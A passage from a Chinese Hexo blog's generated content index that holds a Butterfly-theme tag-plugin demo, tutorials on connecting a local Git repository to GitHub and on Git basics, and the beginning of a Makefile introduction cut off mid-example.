class="line">&#123;% endnote %&#125;</span><br><span class="line">&#123;% note blue &#x27;fas fa-bullhorn&#x27; flat %&#125;</span><br><span class="line">2021 年即将到来....</span><br><span class="line">&#123;% endnote %&#125;</span><br><span class="line">&#123;% note pink &#x27;fas fa-car-crash&#x27; flat %&#125;</span><br><span class="line">开车小心，安全第一</span><br><span class="line">&#123;% endnote %&#125;</span><br><span class="line">&#123;% note red &#x27;fas fa-fan&#x27; flat %&#125;</span><br><span class="line">这是三刀还是四刀？</span><br><span class="line">&#123;% endnote %&#125;</span><br><span class="line">&#123;% note orange &#x27;fas fa-battery-half&#x27; flat %&#125;</span><br><span class="line">您在使用 Visa 还是银联</span><br><span class="line">&#123;% endnote %&#125;</span><br><span class="line">&#123;% note purple &#x27;far fa-hand-scissors&#x27; flat %&#125;</span><br><span class="line">剪刀石头布</span><br><span class="line">&#123;% endnote %&#125;</span><br><span class="line">&#123;% note green &#x27;fab fa-internet-explorer&#x27; flat %&#125;</span><br><span class="line">前端开发者最讨厌的浏览器</span><br><span class="line">&#123;% endnote %&#125;</span><br></pre></td></tr></table></figure><div class="note icon-padding flat"><i class="note-icon fab fa-cc-visa"></i><p>您在使用 Visa 还是银联</p></div><div class="note blue icon-padding flat"><i class="note-icon fas fa-bullhorn"></i><p>2021 年即将到来….</p></div><div class="note pink icon-padding flat"><i class="note-icon fas fa-car-crash"></i><p>开车小心，安全第一</p></div><div class="note red icon-padding flat"><i class="note-icon fas fa-fan"></i><p>这是三刀还是四刀？</p></div><div class="note orange icon-padding flat"><i class="note-icon fas fa-battery-half"></i><p>您在使用 Visa 还是银联</p></div><div class="note purple icon-padding flat"><i class="note-icon far fa-hand-scissors"></i><p>剪刀石头布</p></div><div class="note green icon-padding flat"><i class="note-icon fab fa-internet-explorer"></i><p>前端开发者最讨厌的浏览器</p></div><hr /><h2 id="标签">标签</h2><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&#123;% tabs test1 %&#125;</span><br><span class="line">&lt;!-- tab --&gt;</span><br><span class="line"><span class="strong">**这是标签 1。**</span></span><br><span class="line">&lt;!-- endtab --&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- tab --&gt;</span><br><span class="line"><span class="strong">**这是标签 2。**</span></span><br><span class="line">&lt;!-- endtab --&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- tab --&gt;</span><br><span class="line"><span class="strong">**这是标签 3。**</span></span><br><span class="line">&lt;!-- endtab --&gt;</span><br><span class="line">&#123;% endtabs %&#125;</span><br></pre></td></tr></table></figure><div class="tabs"><div class="nav-tabs"><button type="button" class="tab active">test1 1</button><button type="button" class="tab">test1 2</button><button type="button" class="tab">test1 3</button></div><div class="tab-contents"><div class="tab-item-content active"><p><strong>这是标签 1。</strong></p></div><div class="tab-item-content"><p><strong>这是标签 2。</strong></p></div><div class="tab-item-content"><p><strong>这是标签 3。</strong></p></div></div><div class="tab-to-top"><button type="button" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div><hr /><h2 id="按钮">按钮</h2><h3 id="行内">行内</h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">这是我的网站，点击按钮 &#123;% btn &#x27;https://butterfly.js.org&#x27;,Butterfly %&#125;</span><br><span class="line">这是我的网站，点击按钮 &#123;% btn &#x27;https://butterfly.js.org&#x27;,Butterfly,,outline%&#125;</span><br></pre></td></tr></table></figure><p>这是我的网站，点击按钮 <a class="btn-beautify " href="https://butterfly.js.org" title="Butterfly"><span>Butterfly</span></a> 这是我的网站，点击按钮<a class="btn-beautify outline" href="https://butterfly.js.org" title="Butterfly"><span>Butterfly</span></a></p><hr /><h3 id="块">块</h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">这是我的网站，点击按钮  &#123;% btn &#x27;https://butterfly.js.org&#x27;,Butterfly,far fa-hand-point-right,block larger %&#125;</span><br><span class="line">这是我的网站，点击按钮  &#123;% btn &#x27;https://butterfly.js.org&#x27;,Butterfly,far fa-hand-point-right,block center larger %&#125;</span><br><span class="line">这是我的网站，点击按钮  &#123;% btn &#x27;https://butterfly.js.org&#x27;,Butterfly,far fa-hand-point-right,block right blue larger %&#125;</span><br></pre></td></tr></table></figure><p>这是我的网站，点击按钮 <a class="btn-beautify block larger" href="https://butterfly.js.org" title="Butterfly"><i class="far fa-hand-point-right"></i><span>Butterfly</span></a> 这是我的网站，点击按钮<a class="btn-beautify block center larger" href="https://butterfly.js.org" title="Butterfly"><i class="far fa-hand-point-right"></i><span>Butterfly</span></a> 这是我的网站，点击按钮 <a class="btn-beautify block right blue larger" href="https://butterfly.js.org" title="Butterfly"><i class="far fa-hand-point-right"></i><span>Butterfly</span></a></p><hr /><h3 id="选项">选项</h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;btn-center&quot;</span>&gt;</span></span></span><br><span class="line">&#123;% btn &#x27;https://butterfly.js.org&#x27;,Butterfly,far fa-hand-point-right,larger %&#125;</span><br><span class="line">&#123;% btn &#x27;https://butterfly.js.org&#x27;,Butterfly,far fa-hand-point-right,blue larger %&#125;</span><br><span class="line">&#123;% btn &#x27;https://butterfly.js.org&#x27;,Butterfly,far fa-hand-point-right,pink larger %&#125;</span><br><span class="line">&#123;% btn &#x27;https://butterfly.js.org&#x27;,Butterfly,far fa-hand-point-right,red larger %&#125;</span><br><span class="line">&#123;% btn &#x27;https://butterfly.js.org&#x27;,Butterfly,far fa-hand-point-right,purple larger %&#125;</span><br><span class="line">&#123;% btn &#x27;https://butterfly.js.org&#x27;,Butterfly,far fa-hand-point-right,orange larger %&#125;</span><br><span class="line">&#123;% btn &#x27;https://butterfly.js.org&#x27;,Butterfly,far fa-hand-point-right,green larger %&#125;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br></pre></td></tr></table></figure><div class="btn-center"><a class="btn-beautify larger" href="https://butterfly.js.org" title="Butterfly"><i class="far fa-hand-point-right"></i><span>Butterfly</span></a><a class="btn-beautify blue larger" href="https://butterfly.js.org" title="Butterfly"><i class="far fa-hand-point-right"></i><span>Butterfly</span></a><a class="btn-beautify pink larger" href="https://butterfly.js.org" title="Butterfly"><i class="far fa-hand-point-right"></i><span>Butterfly</span></a><a class="btn-beautify red larger" href="https://butterfly.js.org" title="Butterfly"><i class="far fa-hand-point-right"></i><span>Butterfly</span></a><a class="btn-beautify purple larger" href="https://butterfly.js.org" title="Butterfly"><i class="far fa-hand-point-right"></i><span>Butterfly</span></a><a class="btn-beautify orange larger" href="https://butterfly.js.org" title="Butterfly"><i class="far fa-hand-point-right"></i><span>Butterfly</span></a><a class="btn-beautify green larger" href="https://butterfly.js.org" title="Butterfly"><i class="far fa-hand-point-right"></i><span>Butterfly</span></a></div><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;btn-center&quot;</span>&gt;</span></span></span><br><span class="line">&#123;% btn &#x27;https://butterfly.js.org&#x27;,Butterfly,far fa-hand-point-right,outline larger %&#125;</span><br><span class="line">&#123;% btn &#x27;https://butterfly.js.org&#x27;,Butterfly,far fa-hand-point-right,outline blue larger %&#125;</span><br><span class="line">&#123;% btn &#x27;https://butterfly.js.org&#x27;,Butterfly,far fa-hand-point-right,outline pink larger %&#125;</span><br><span class="line">&#123;% btn &#x27;https://butterfly.js.org&#x27;,Butterfly,far fa-hand-point-right,outline red larger %&#125;</span><br><span class="line">&#123;% btn &#x27;https://butterfly.js.org&#x27;,Butterfly,far fa-hand-point-right,outline purple larger %&#125;</span><br><span class="line">&#123;% btn &#x27;https://butterfly.js.org&#x27;,Butterfly,far fa-hand-point-right,outline orange larger %&#125;</span><br><span class="line">&#123;% btn &#x27;https://butterfly.js.org&#x27;,Butterfly,far fa-hand-point-right,outline green larger %&#125;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br></pre></td></tr></table></figure><div class="btn-center"><a class="btn-beautify outline larger" href="https://butterfly.js.org" title="Butterfly"><i class="far fa-hand-point-right"></i><span>Butterfly</span></a><a class="btn-beautify outline blue larger" href="https://butterfly.js.org" title="Butterfly"><i class="far fa-hand-point-right"></i><span>Butterfly</span></a><a class="btn-beautify outline pink larger" href="https://butterfly.js.org" title="Butterfly"><i class="far fa-hand-point-right"></i><span>Butterfly</span></a><a class="btn-beautify outline red larger" href="https://butterfly.js.org" title="Butterfly"><i class="far fa-hand-point-right"></i><span>Butterfly</span></a><a class="btn-beautify outline purple larger" href="https://butterfly.js.org" title="Butterfly"><i class="far fa-hand-point-right"></i><span>Butterfly</span></a><a class="btn-beautify outline orange larger" href="https://butterfly.js.org" title="Butterfly"><i class="far fa-hand-point-right"></i><span>Butterfly</span></a><a class="btn-beautify outline green larger" href="https://butterfly.js.org" title="Butterfly"><i class="far fa-hand-point-right"></i><span>Butterfly</span></a></div>]]></content>
      
      
      <categories>
          
          <category> 博客搭建 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Blog Writing Tips </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Git Remote Connection</title>
      <link href="/zh/2022/07/17/Tools/Git%20Remote%20Connection/"/>
      <url>/zh/2022/07/17/Tools/Git%20Remote%20Connection/</url>
      
        <content type="html"><![CDATA[<p>这篇文章是基于之前的《Git入门》文章写的，主要是因为我在尝试将一些资源文件上传到 GitHub时遇到了不少问题。</p><p>我认为目前可以实现的建立连接的方式有 <strong>两种</strong>。</p><p>在描述实现方法之前，我认为我们应该了解<strong>远程操作命令</strong>。</p><h2 id="常用-git-命令">常用 Git 命令</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">git init                    //初始化本地仓库，生成 .git 文件夹，这是 git 的核心</span><br><span class="line"></span><br><span class="line">git add [target]            //将目标文件添加到暂存区</span><br><span class="line"></span><br><span class="line">git rm -f &lt;filename&gt;        //该命令将文件从暂存区和工作目录中删除</span><br><span class="line"></span><br><span class="line">git rm --cached &lt;filename&gt;  //当你添加了不想要的文件时，该命令可以从暂存区删除文件，但保留在工作目录中</span><br><span class="line"></span><br><span class="line">git commit                  //提交暂存区的文件，使用 -m [message] 添加必要信息（如果没有添加也可以自动弹出）</span><br><span class="line"></span><br><span class="line">git status                  //查看 git 状态</span><br><span class="line"></span><br><span class="line">git clone [url or ssh]      </span><br><span class="line">//非常重要的一点是直接克隆远程仓库，默认会自动连接到克隆的远程仓库，命名为 origin</span><br><span class="line"></span><br><span class="line">git pull origin master      </span><br><span class="line">//将远程仓库 &quot;origin&quot; 中对应的分支拉取到本地仓库的 master，通常在 push 之前需要先拉取最新的仓库</span><br><span class="line"></span><br><span class="line">git pull origin master --allow-unrelated-histories </span><br><span class="line">//如果本地和远程是两个独立的仓库，拉取时需要指定 &quot;allow unrelated histories merge&quot;，否则会失败</span><br><span class="line"></span><br><span class="line">git push origin master </span><br><span class="line">//将本地仓库的内容提交到远程仓库（origin 是远程分支名称，master 是当前分支名称。注意该命令并不完全完整，实际使用中，如果是第一次提交到远程，应该使用 [git push -u origin master]，如果不是第一次，则直接使用 git push）</span><br><span class="line"></span><br><span class="line">git remote add origin [url or ssh]</span><br><span class="line">//添加一个远程仓库连接并命名为 &quot;origin&quot;，当然也可以自定义其他名称，但一般命名为 origin</span><br><span class="line"></span><br><span class="line">git remote rm origin        //删除名为 &quot;origin&quot; 的远程仓库连接</span><br><span class="line"></span><br><span class="line">git remote set-url origin [url or ssh]</span><br><span class="line">//修改 &quot;origin&quot; 的 url（结合上面的命令，有两种修改远程仓库连接的方法：一种是删除再添加，另一种是直接修改）</span><br><span class="line"></span><br></pre></td></tr></table></figure><blockquote><p>URL 和 SSH 可以从仓库界面的代码按钮中查看和复制，SSH 更加安全。</p></blockquote><figure><imgsrc="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/20200213161009663.png"alt="原理" /><figcaption aria-hidden="true">原理</figcaption></figure><h3 id="git-add-.-和-git-add-的区别">git add . 和 git add * 的区别</h3><p>git add . 会添加所有文件、文件夹和子文件夹，包括 .gitignore和任何其他以点开头的内容；</p><p>git add *会添加任何文件、文件夹和子文件夹，但不包括以点开头的文件。</p><p>git add . 也会遵循 .gitignore，而 git add * 在任何非点文件被gitignore 时会抛出错误。<u>使用 git add . 比 git add *要好得多</u>。</p><p>* 不是 git 的一部分，它是由 shell 解释的通配符。 *扩展为当前目录中的所有文件，然后传递给 git，git 添加所有文件。 .是当前目录本身，git add 会添加它及其下的所有文件。</p><p>add *意味着添加当前目录中的所有文件，除了名称以点开头的文件。这是一个 shell特性，Git 只接收文件列表。</p><p>add . 在 shell 中没有特殊含义，因此 git会递归添加整个目录，几乎是一样的，但包括名称以点开头的文件。</p><h3 id="删除远程仓库文件的方法">删除远程仓库文件的方法</h3><p>删除时需要注意的一点是，暂存区中的文件<u>在提交后不会被清除</u>。同样，你删除的文件仍在暂存区，你需要<u>从暂存区移除已删除的文件</u>，才能提交。</p><h4id="从当前工作目录和暂存区删除文件或目录">从当前工作目录和暂存区删除文件或目录。</h4><p><code>git rm &lt;file&gt;</code><code>git rm -r &lt;path&gt;</code></p><h4 id="仅从暂存区删除文件或目录">仅从暂存区删除文件或目录。</h4><p><code>git rm --cached &lt;file&gt;</code><code>git rm -r --cached &lt;path&gt;</code></p><h4 id="直接删除方法">直接删除方法</h4><p>直接删除指定的文件或目录。适合需要删除的文件数量相对较少的情况。</p><p><code>git rm -r --cached demo</code><code>git commit -m '删除 demo 文件夹'</code><code>git push -u origin master</code></p><h4 id="过滤删除方法">过滤删除方法</h4><p>在项目根目录添加 .gitignore文件以过滤掉不需要的文件，然后执行命令。该操作的原理是删除暂存区中的所有文件，然后通过git add . 命令将 .gitignore文件过滤的文件添加到暂存区。此方法适合批量删除文件。</p><p><code>git rm -r --cached .</code> <code>git add .</code><code>git commit</code> <code>git push  -u origin master</code></p><p>无论是直接删除还是过滤删除，目的是删除暂存区中已删除文件的记录。</p><p>PS：注意命令行提示中的各种信息</p><h2 id="第一个实现方法-git-clone">第一个实现方法 (git clone)</h2><h3 id="步骤1在-github-上创建一个名为-git_test-的仓库">步骤1：在 GitHub上创建一个名为 git_test 的仓库</h3><p><imgsrc="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/%E6%88%AA%E5%B1%8F2022-07-17%2017.12.03.png" /></p><h3 id="步骤2进入一个文件夹并使用-git-clone">步骤2：进入一个文件夹并使用git clone <repository URL or SSH></h3><p><imgsrc="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/%E6%88%AA%E5%B1%8F2022-07-17%2019.28.52.png" /></p><p>此时，git clone完全克隆了整个仓库到本地。它会生成一个与仓库同名的文件夹。进入该文件夹，你可以直接看到.git 文件。</p><h3id="步骤3无需远程连接自动建立连接默认是-origin">步骤3：无需远程连接，自动建立连接（默认是origin）</h3><p>使用 git remote -v 查看远程连接信息</p><p><imgsrc="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/%E6%88%AA%E5%B1%8F2022-07-17%2019.35.28.png" /></p><h3id="步骤4创建测试文件并提交到远程仓库">步骤4：创建测试文件并提交到远程仓库</h3><p><imgsrc="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/%E6%88%AA%E5%B1%8F2022-07-17%2019.39.24.png" /></p><p><imgsrc="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/%E6%88%AA%E5%B1%8F2022-07-17%2019.42.25.png" /></p><p>测试完成！</p><h2 id="第二个实现方法-初始化本地仓库-手动添加连接">第二个实现方法(初始化本地仓库 + 手动添加连接)</h2><h3 id="步骤1在-github-上创建一个新仓库同时初始化本地仓库">步骤1：在GitHub 上创建一个新仓库，同时初始化本地仓库</h3><p>创建新仓库：</p><p><imgsrc="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/%E6%88%AA%E5%B1%8F2022-07-17%2019.52.37.png" /></p><p>进入文件夹 ~/Desktop/git_freely 并使用 git init 初始化本地仓库</p><p><imgsrc="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/%E6%88%AA%E5%B1%8F2022-07-17%2019.54.27.png" /></p><p>可以看到本地仓库尚未建立远程连接。</p><h3 id="步骤2建立远程连接">步骤2：建立远程连接</h3><p><imgsrc="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/%E6%88%AA%E5%B1%8F2022-07-17%2019.56.10.png" /></p><p>此时可以看到已经建立了远程连接，给远程仓库的名称其实可以随意（通常是origin），我命名为 lixiang。</p><h3id="提问此时我们可以直接根据第一个实现方法创建测试文件然后-git-addcommitpush-吗"><u>提问：此时我们可以直接根据第一个实现方法创建测试文件，然后git add、commit、push 吗？</u></h3><p>既然我提问了，那肯定是不可以的😄，如果你不相信我们来试试。</p><p><imgsrc="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/%E6%88%AA%E5%B1%8F2022-07-17%2020.02.15.png" /></p><p>为什么？</p><p>这可能需要理解一些 git的基本原理。我相信大家都听说过它被称为分布式版本控制。我们只关注“版本控制”这四个字。你的本地仓库是否有远程仓库的任何版本？你需要知道，当你在GitHub 上创建一个新仓库时，它有一个名为 <u>initial commit</u>的第一个版本（可能不叫这个），但总之，我想说的是创建伴随着第一次初始化提交，但本地没有。你可能会问，为什么没有，你怎么知道？我们来用git log 检查一下😜</p><p><imgsrc="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/%E6%88%AA%E5%B1%8F2022-07-17%2020.09.01.png" /></p><p>让我解释一下，这是我为了演示我提到的反例而做的提交。实际上，应该是git log 后没有任何内容。</p><h3 id="解决方案">解决方案：</h3><p>只需拉取远程仓库的初始化版本，作为本地的基础版本，这就是版本控制的意义。gitpull 是非常直观的</p><p><imgsrc="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/%E6%88%AA%E5%B1%8F2022-07-17%2020.13.45.png" /></p><p>它提示该操作不成功，因为我有一个 test.txt文件，而本地仓库的第一次提交与远程仓库的初始版本不同，因此提示我有分歧的分支，等等，正如它的提示所说，你可以使用<code>git pull --rebase lixiang main</code></p><p>你可能不知道这个 <code>--rebase</code>是做什么的，它实际上是分支合并提交，直接将远程仓库和本地仓库合并，而不管它，生成一个提交。</p><p><imgsrc="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/%E6%88%AA%E5%B1%8F2022-07-17%2020.22.04.png" /></p><p>成功了！让我们用 git log 检查一下……</p><p><imgsrc="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/%E6%88%AA%E5%B1%8F2022-07-17%2020.23.03.png" /></p><p>可以看到远程仓库的 Initial commit已经与我第一次的本地提交合并，但此时远程和本地仓库并不同步！需要上传到远程仓库。</p><h3 id="步骤3git-push">步骤3：git push</h3><p><imgsrc="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/%E6%88%AA%E5%B1%8F2022-07-17%2020.28.42.png" /></p><p><imgsrc="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/%E6%88%AA%E5%B1%8F2022-07-17%2020.29.24.png" /></p><p>成功了，有一个小问题是分支已经改变。这里的原因是本地初始化的默认分支是master，而远程仓库的默认分支是 main。但这不是大问题。</p><p>修改默认分支的命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git config --global init.defaultBranch &lt;default branch name&gt;</span><br></pre></td></tr></table></figure><p>如果你不理解上述过程，也没关系，我把它写得复杂了，实际上应该简单得多，没问题，让我写一个简单版本。</p><h2 id="第二种方法的简化">第二种方法的简化</h2><h3id="步骤1创建远程仓库并初始化本地仓库">步骤1：创建远程仓库并初始化本地仓库</h3><p><imgsrc="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/%E6%88%AA%E5%B1%8F2022-07-17%2020.35.31.png" /></p><p><imgsrc="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/%E6%88%AA%E5%B1%8F2022-07-17%2020.36.50.png" /></p><h3 id="步骤2手动建立远程连接">步骤2：手动建立远程连接</h3><p><imgsrc="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/%E6%88%AA%E5%B1%8F2022-07-17%2020.43.25.png" /></p><h3 id="步骤3拉取git-pull远程仓库的初始版本">步骤3：拉取（gitpull）远程仓库的初始版本</h3><p><imgsrc="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/%E6%88%AA%E5%B1%8F2022-07-17%2020.44.13.png" /></p><p>如果你看过我之前的解释，你会发现 <code>--rebase</code>参数并不需要，因为初始化后我什么都没做，提交记录是空的，空仓库当然在拉取任何东西时不会产生任何分歧。对于空仓库，根本不存在合并的问题！</p><p>让我们用 git log 检查一下</p><p><imgsrc="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/%E6%88%AA%E5%B1%8F2022-07-17%2020.47.04.png" /></p><p>正是如此！最后一步！😬</p><h3id="步骤4创建测试文件后git-push-上传到远程仓库">步骤4：创建测试文件后，gitpush 上传到远程仓库</h3><p><imgsrc="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/%E6%88%AA%E5%B1%8F2022-07-17%2020.51.01.png" /></p><p>让我们在 GitHub 上检查一下</p><p><imgsrc="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/%E6%88%AA%E5%B1%8F2022-07-17%2020.51.47.png" /></p><h2 id="总结">总结</h2><p>我认为我所说的只是冰山一角，逐步教你如何连接本地和远程仓库并提交你想上传的文件。实际上，GitHub支持直接文件上传，见上图中的 <u>AddFile</u>。我学习这个并没有特别的目的，只是觉得很有趣。如果你想更深入地了解，可以参考我之前的<ahref="https://hustlixiang21.github.io/2022/07/05/git入门/">博客文章</a></p><p>顺便提一下，这篇文章基本上都是我自己写的，但我确实阅读了很多其他人的观点，并且自己不断犯错，但这就是学习的过程。我会在这里附上我参考的一些原创文章。</p><p><a href="https://zhuanlan.zhihu.com/p/359108193">知乎_Git使用（连接远程仓库）</a></p><p><ahref="https://blog.csdn.net/phily123/article/details/121160072">CSDN_删除远程仓库文件</a></p><p><ahref="https://blog.csdn.net/A496608119/article/details/123566231">CSDN_Git本地文件上传到远程仓库</a></p><p><ahref="https://blog.csdn.net/u014630142/article/details/120261403">CSDN_删除Git 远程仓库文件</a></p><p>仔细看看他们写的内容，可能比我写的更清晰。我的目的仍然是通过我对原理和过程的理解，逐步建立连接。这可以说是我第一篇也有点像教程的博客文章。感谢观看！</p>]]></content>
      
      
      <categories>
          
          <category> 工具与工作流 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Study Notes </tag>
            
            <tag> git </tag>
            
            <tag> CS Tools </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Git Introduction</title>
      <link href="/zh/2022/07/05/Tools/Git%20Introduction/"/>
      <url>/zh/2022/07/05/Tools/Git%20Introduction/</url>
      
        <content type="html"><![CDATA[<h1 id="git-介绍">Git 介绍</h1><p>基于清华大学的夏季培训进行一些实践，参考书籍 <ahref="https://git-scm.com/book/en/v2">Pro Git</a>。</p><p>还推荐一个 <ahref="https://learngitbranching.js.org/?locale=zh_CN">快速入门网站</a>，可以更好地增强对分支的理解。</p><span id="more"></span><h2 id="什么是-git">什么是 Git？</h2><p>Git 是一个开源的分布式版本控制系统，用于敏捷和高效的项目处理。</p><h3 id="版本控制">版本控制</h3><p>可以轻松将仓库中的内容恢复到之前的 <strong>commit</strong>。</p><p>原理：使用快照进行版本控制。</p><h3 id="分布式">分布式</h3><p>我的理解是，多个用户可以在不同的主机上，在不同的时间和空间内进行同一开发，而不会相互影响，最后统一提交。</p><h2 id="基本原理">基本原理</h2><p>分为工作目录、暂存区和版本库。文件夹中有一个 .git文件，包含暂存区和版本库，而 .git 之外的区域是工作目录。</p><figure><imgsrc="https://pic2.zhimg.com/80/v2-99d8bb59ba479252bfae5f71554b33aa_1440w.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><h2 id="案例演示">案例演示</h2><p>首先，使用命令行进入当前文件夹。</p><p>需要初始化当前文件夹以创建一个空的仓库，使用命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git init</span><br></pre></td></tr></table></figure><figure><imgsrc="https://pica.zhimg.com/80/v2-099c25239375be8b37a05910cbc07143_1440w.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>将所需文件添加到暂存区：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git add &lt;filename&gt;</span><br></pre></td></tr></table></figure><p>将暂存区中的文件提交到版本库：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git commit </span><br></pre></td></tr></table></figure><p>==此时，默认编辑器通常会弹出，要求对该提交进行描述。通常需要统一标准，写得清晰且详细。==</p><figure><imgsrc="https://pic1.zhimg.com/80/v2-245d2877ae4fc8dfe9e8b64e3e8081e2_1440w.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><h3 id="一些常用命令">一些常用命令</h3><p>查看提交日志：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">log</span></span><br></pre></td></tr></table></figure><figure><imgsrc="https://pic1.zhimg.com/80/v2-1025580221e635d84f2ebf13e632c0fe_1440w.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>查看 git 状态，即暂存区中的文件。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git status</span><br></pre></td></tr></table></figure><figure><imgsrc="https://pic3.zhimg.com/80/v2-0edf6701fd8e886a2a037d0cc283edb9_1440w.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>比较 <strong>工作目录文件</strong> 与上一个提交，并输出差异。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git diff</span><br></pre></td></tr></table></figure><figure><imgsrc="https://picx.zhimg.com/80/v2-0c8cd096128899e7b95e084d974e0214_1440w.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><h3 id="分支和远程操作">分支和远程操作</h3><p>请参见文章开头的网站教程，生动自然，令人印象深刻。</p>]]></content>
      
      
      <categories>
          
          <category> 工具与工作流 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Study Notes </tag>
            
            <tag> git </tag>
            
            <tag> CS Tools </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Makefile Introduction</title>
      <link href="/zh/2022/06/20/Tools/Makefile%20Introduction/"/>
      <url>/zh/2022/06/20/Tools/Makefile%20Introduction/</url>
      
        <content type="html"><![CDATA[<h1 id="makefile-概念介绍">Makefile 概念介绍</h1><p><a href="https://zhuanlan.zhihu.com/p/29910215">原始知乎链接</a></p><p><ahref="https://www.cnblogs.com/paul-617/p/15501875.html">博客解释链接</a></p><p><ahref="https://blog.csdn.net/weixin_38391755/article/details/80380786">另一个解释</a></p><p>本文主要介绍如何使用“基于目标的分层”方法来理解一个工具，编写概念，定义设计或部署一组代码。</p><p>本文首先是“Makefile 介绍”，然后是“基于目标的分层方法介绍”。</p><span id="more"></span><h2 id="关于程序编译">关于程序编译</h2><p>Makefile 解决的是编译的问题。Makefile 最初是用来解决 C语言的编译问题的，所以与 C 的关系特别密切，但并不是说 Makefile只能用来解决 C 的编译问题。你用来处理 Java 一点问题没有，但对于Java，显然 ant 比 Makefile 处理得更好。</p><p>比如说，你有 foo.c、bar.c、main.c 三个 C 文件，你要编译成一个app.executable，你会怎么做呢？你会执行这样的命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">gcc -Wall -c foo.c -o foo.o</span><br><span class="line">gcc -Wall -c bar.c -o bar.o</span><br><span class="line">gcc -Wall -c main.c -o main.o</span><br><span class="line">gcc main.o foo.o bar.o 